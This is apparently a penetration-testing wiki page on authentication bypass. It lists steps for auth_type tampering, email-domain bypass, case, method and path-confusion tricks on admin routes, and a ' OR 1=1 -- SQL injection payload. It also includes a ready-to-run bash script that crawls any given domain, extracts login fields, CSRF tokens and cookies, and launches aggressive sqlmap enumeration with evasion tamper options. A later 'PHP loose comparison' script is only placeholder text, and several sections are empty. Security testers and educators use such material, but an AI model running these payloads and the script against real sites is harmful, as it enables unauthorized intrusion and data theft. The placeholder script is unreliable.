# Bypassing Authentication Schema

## Check List

* [ ] Ensure that authentication is applied across all services that require it.

## Methodology

### Black Box

#### Auth Type Manipulation

{% stepper %}
{% step %}
Log in to the target site, go to the authentication page, and check if it uses multiple types of authentication, such as password, email, Google, and Facebook
{% endstep %}

{% step %}
Enter the request using an incorrect password and email address. Intercept the POST request using Bupr Suite
{% endstep %}

{% step %}
Then examine the intercepted request and see if you see a parameter called `auth_type`
{% endstep %}

{% step %}
If you see such a parameter that specifies the type of authentication with Google or Facebook or password and email, send the request to the repeater
{% endstep %}

{% step %}
And then change the authentication type in the `auth_type` parameter to facebook

```json
"auth_type": "email" → "facebook"
```
{% endstep %}

{% step %}
If the user information is displayed in the server response, the authentication bypass is confirmed
{% endstep %}
{% endstepper %}

***

#### Email Domain Validation Bypass

{% stepper %}
{% step %}
Access registration form
{% endstep %}

{% step %}
Enter email `test@redacted.com`, Capture `POST` request in Burp
{% endstep %}

{% step %}
Notice server prepends or validates only suffix (`@redacted.com`)

```http
email=bishal@redacted.com
```
{% endstep %}

{% step %}
Modify email domain to any external domain

```
email=bishal0x01@bugcrowdninja.com
```
{% endstep %}

{% step %}
Send request
{% endstep %}

{% step %}
Receive verification email at `bishal0x01@bugcrowdninja.com`
{% endstep %}

{% step %}
Click link, Account activated
{% endstep %}
{% endstepper %}

***

#### Change The Letter Case

{% stepper %}
{% step %}
Use the [enumerate Application](https://unk9vvn.gitbook.io/penetration-testing/web/reconnaissance/enumerate-applications) command to perform the identification process and obtain the sensitive paths of the admin panel
{% endstep %}

{% step %}
Access known admin path

```http
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 in response, then send the following request

```http
GET /AdMiN HTTP/1.1
GET /ADMIN HTTP/1.1
GET /aDmIn HTTP/1.1
GET /Admin HTTP/1.1
GET /aDMIN HTTP/1.1
```
{% endstep %}

{% step %}
If any variation returns 200 OK, Case sensitivity bypass confirmed
{% endstep %}
{% endstepper %}

***

#### HTTP Method Bypass Auth

{% stepper %}
{% step %}
Make a request to the admin panel and check if it gives you a 403 in response
{% endstep %}

{% step %}
If it gives you a 403 error with a 401 then change the HTTP method to PUT or Patch or ...

```http
PATCH /admin HTTP/1.1
HEAD /admin HTTP/1.1
PUT /admin HTTP/.1.1
```
{% endstep %}
{% endstepper %}

***

#### Path Confusion Auth Bypass

{% stepper %}
{% step %}
Request a sensitive route like the panel or admin route and if it gives you a 403, try to mislead the route using the payload below

```http
GET /%2e%2e/admin HTTP/1.1
```
{% endstep %}

{% step %}
If the server response shows login or admin information, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### [Fullname Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)

{% stepper %}
{% step %}
Navigate to the SignUp page of the target website, typically located at a URL like `/signup` or `/register` Open https://example.com/signup in the browser
{% endstep %}

{% step %}
Identify the “Full Name” input field in the SignUp form, which is prone to processing user input directly into database queries Find the text box labeled “Full Name” in the form
{% endstep %}

{% step %}
Enter the payload `' OR 1=1 --` into the Full Name field to attempt bypassing the query’s conditions and access unauthorized data Input `John' OR 1=1 --` in the Full Name field
{% endstep %}

{% step %}
Click the `“Sign Up”` button to send the payload to the server via a <sub>POST</sub> request
{% endstep %}

{% step %}
Look for a generic error (“Invalid input”) or a `400`/`500` status code, indicating the payload was blocked, or unexpected success, suggesting a vulnerability
{% endstep %}

{% step %}
If a 400/500 error appears, modify the payload to `' OR 1=2 --` and submit again. Compare responses: if `' OR 1=1 --` allows form submission or data access (account creation without valid input) while `' OR 1=2 --` fails, it confirms SQL injection, as the true condition (`1=1`) altered the query’s logic
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet

#### Parameter Modification <a href="#parameter-modification" id="parameter-modification"></a>



#### Session ID Prediction <a href="#session-id-prediction" id="session-id-prediction"></a>



#### SQL Injection (HTML Form Authentication) <a href="#sql-injection-html-form-authentication" id="sql-injection-html-form-authentication"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [SQLMap](https://github.com/sqlmapproject/sqlmap)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-sqli.sh
```

```bash
#!/bin/bash

# Config & Colors
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

# Root Check
[[ "$(id -u)" -ne 0 ]] && { color_print RED "[X] Please run as ROOT."; exit 1; }

# Input Check
if [ $# -lt 1 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
DEPS="git sqlmap"

# Install Katana
if ! command -v katana &>/dev/null; then
    color_print GREEN "[*] Installing katana ..."
    go install github.com/projectdiscovery/katana/cmd/katana@latest;sudo ln -fs ~/go/bin/katana /usr/bin/katana
fi

# Install Packages
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null; then
        color_print YELLOW "[!] Installing $pkg..."
        apt install -y "$pkg"
    fi
done

# Find Login Page
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sed 's:$:/:')

if [ -z "$LOGIN" ]; then
    echo "[!] No login page found. Exiting."
    exit 1
fi

color_print GREEN "[+] Found login page: $LOGIN"

# Fetch HTML
HTML=$(curl -s "$LOGIN")
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# CAPTCHA / reCAPTCHA Check
CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
    color_print YELLOW "[!] CAPTCHA detected on login page. Continuing anyway..."
fi

# Extract Form Action and Method
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
[ -z "$ACTION" ] && ACTION="$LOGIN"

METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
[ -z "$METHOD" ] && METHOD="post"

if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

color_print CYAN "[+] Form Action: $FULL_ACTION"
color_print CYAN "[+] Form Method: $METHOD"

# Extract Username & Password Fields
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

[ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
[ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"

color_print CYAN "[+] Username field: $USERNAME_FIELD"
color_print CYAN "[+] Password field: $PASSWORD_FIELD"

# CSRF Token Extraction
CSRF_FIELD=""
CSRF_VALUE=""

HIDDEN_INPUTS=$(echo "$FORM" | grep -oiP '<input[^>]+type=["'\'']?hidden["'\'']?[^>]*>')
while read -r INPUT; do
    NAME=$(echo "$INPUT" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+')
    VALUE=$(echo "$INPUT" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+')
    if [[ "$NAME" =~ csrf|token|nonce|authenticity|verification ]]; then
        CSRF_FIELD="$NAME"
        CSRF_VALUE="$VALUE"
        break
    fi
done <<< "$HIDDEN_INPUTS"

if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
    CSRF_FIELD=$(echo "$HIDDEN_INPUTS" | grep -oiP 'name=["'\'']?\K[^"'\'' ]+' | head -1)
    CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
fi

if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    color_print CYAN "[+] CSRF field found: $CSRF_FIELD"
fi

# Extract Cookies
COOKIES=$(curl -s -I "$LOGIN" \
  | grep -i '^Set-Cookie:' \
  | sed -E 's/^Set-Cookie: //I' \
  | cut -d';' -f1 \
  | tr '\n' ';' \
  | sed 's/;$//')

# Extract only domain and port
HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')

# Prepare data for sqlmap
if [[ "$METHOD" == "get" ]]; then
    # For GET requests, sqlmap will use URL parameters
    SQLMAP_URL="${FULL_ACTION}?${USERNAME_FIELD}=test&${PASSWORD_FIELD}=test"
    [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && SQLMAP_URL="${SQLMAP_URL}&${CSRF_FIELD}=${CSRF_VALUE}"
    sqlmap -u "$SQLMAP_URL" \
        --cookie="$COOKIES" \
        --batch \
        --level=3 \
        --risk=3 \
        -v 3 \
        --user-random-agent \
        --threads=10 \
        --tamper=space2comment,charencode \
        --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
        --not-string="invalid\|incorrect\|failed\|error\|denied" \
        --dbs \
        --banner \
        --current-user \
        --current-db \
        --is-dba
else
    # For POST requests, prepare data string
    DATA="${USERNAME_FIELD}=test&${PASSWORD_FIELD}=test"
    [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
    sqlmap -u "$FULL_ACTION" \
        --data="$DATA" \
        --cookie="$COOKIES" \
        --batch \
        --level=3 \
        --risk=3 \
        -v 3 \
        --user-random-agent \
        --threads=10 \
        --tamper=space2comment,charencode \
        --string="dashboard\|welcome\|home\|profile\|logout\|admin" \
        --not-string="invalid\|incorrect\|failed\|error\|denied" \
        --dbs \
        --banner \
        --current-user \
        --current-db \
        --is-dba
fi
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-sqli.sh;sudo ./auth-bypass-sqli.sh $WEBSITE
```

#### PHP Loose Comparison <a href="#php-loose-comparison" id="php-loose-comparison"></a>

#### [Katana ](https://github.com/projectdiscovery/katana)& [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano auth-bypass-tj.sh
```

```bash
aaaa
a
a
a
a
a
a
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x auth-bypass-tj.sh;sudo ./auth-bypass-tj.sh $WEBSITE
```
